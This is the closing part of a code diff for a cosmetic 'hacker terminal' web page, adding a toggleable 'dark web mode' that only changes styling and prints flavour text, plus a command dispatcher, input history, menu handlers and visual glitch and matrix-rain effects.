+                addOutput('<span class="text-red">   ☠️  DEATH AWAITS THE UNWARY  ☠️</span>');
+            },
+
+            darkweb: async () => {
+                document.body.classList.toggle('darkweb-mode');
+                const isDarkweb = document.body.classList.contains('darkweb-mode');
+                
+                flashGlitch();
+                flashGlitch();
+                
+                if (isDarkweb) {
+                    addOutput('<span class="text-purple">═══════════════════════════════════════</span>');
+                    addOutput('<span class="text-purple">   🌑 DARK WEB MODE ACTIVATED 🌑</span>');
+                    addOutput('<span class="text-purple">   Routing through TOR network...</span>');
+                    addOutput('<span class="text-purple">   Your identity is now hidden.</span>');
+                    addOutput('<span class="text-purple">═══════════════════════════════════════</span>');
+                } else {
+                    addOutput('<span class="text-cyan">═══════════════════════════════════════</span>');
+                    addOutput('<span class="text-cyan">   ☀️ NORMAL MODE RESTORED ☀️</span>');
+                    addOutput('<span class="text-cyan">   Disconnected from TOR network.</span>');
+                    addOutput('<span class="text-cyan">═══════════════════════════════════════</span>');
+                }
+            },
+
+            clear: async () => {
+                output.innerHTML = '';
+            }
+        };
+
+        async function executeCommand(cmd) {
+            cmd = cmd.trim().toLowerCase();
+            
+            addOutput(`<span class="text-cyan">root@nexus:~$</span> ${cmd}`);
+            
+            if (cmd === '') return;
+            
+            // Add to history
+            if (cmd !== commandHistory[commandHistory.length - 1]) {
+                commandHistory.push(cmd);
+            }
+            historyIndex = commandHistory.length;
+            
+            if (commands[cmd]) {
+                commandInput.disabled = true;
+                playSound('enter');
+                await commands[cmd]();
+                commandInput.disabled = false;
+                commandInput.focus();
+            } else {
+                playSound('error');
+                addOutput(`<span class="text-red">Error: Command '${cmd}' not found. Type 'help' for available commands.</span>`);
+            }
+            
+            addOutput('');
+        }
+
+        // Command Input Handler
+        commandInput.addEventListener('keydown', async (e) => {
+            if (e.key === 'Enter') {
+                const cmd = commandInput.value;
+                commandInput.value = '';
+                await executeCommand(cmd);
+            } else if (e.key === 'ArrowUp') {
+                e.preventDefault();
+                if (historyIndex > 0) {
+                    historyIndex--;
+                    commandInput.value = commandHistory[historyIndex];
+                }
+            } else if (e.key === 'ArrowDown') {
+                e.preventDefault();
+                if (historyIndex < commandHistory.length - 1) {
+                    historyIndex++;
+                    commandInput.value = commandHistory[historyIndex];
+                } else {
+                    historyIndex = commandHistory.length;
+                    commandInput.value = '';
+                }
+            } else {
+                playSound('keypress');
+            }
+        });
+
+        // Command Menu
+        const menuToggle = document.getElementById('menu-toggle');
+        const menuDropdown = document.getElementById('menu-dropdown');
+
+        menuToggle.addEventListener('click', () => {
+            menuDropdown.classList.toggle('active');
+        });
+
+        document.querySelectorAll('.menu-item').forEach(item => {
+            item.addEventListener('click', async () => {
+                const cmd = item.dataset.cmd;
+                menuDropdown.classList.remove('active');
+                commandInput.value = cmd;
+                await executeCommand(cmd);
+            });
+        });
+
+        // Close menu when clicking outside
+        document.addEventListener('click', (e) => {
+            if (!e.target.closest('.command-menu')) {
+                menuDropdown.classList.remove('active');
+            }
+        });
+
+        // Focus input when clicking terminal
+        terminalBody.addEventListener('click', (e) => {
+            if (!e.target.closest('.command-menu')) {
+                commandInput.focus();
+            }
+        });
+
+        // File click handler (event delegation)
+        output.addEventListener('click', async (e) => {
+            if (e.target.classList.contains('file')) {
+                const filename = e.target.dataset.filename;
+                if (filename) {
+                    commandInput.disabled = true;
+                    await typeOutput(`> Opening file: ${filename}...`, 20);
+                    await sleep(300);
+                    await openFile(filename);
+                    commandInput.disabled = false;
+                    commandInput.focus();
+                }
+            }
+        });
+
+        // Random screen glitch effect
+        function randomGlitch() {
+            if (Math.random() > 0.97) {
+                document.body.style.filter = 'hue-rotate(90deg)';
+                flashGlitch();
+                setTimeout(() => {
+                    document.body.style.filter = 'none';
+                }, 50);
+            }
+            setTimeout(randomGlitch, 100);
+        }
+
+        // Initialize
+        createMatrixRain();
+        bootSequence();
+        randomGlitch();
+
+        // Initialize audio on first click
+        document.body.addEventListener('click', () => {
+            if (!audioContext) initAudio();
+        }, { once: true });
+    </script>
+</body>
+</html>
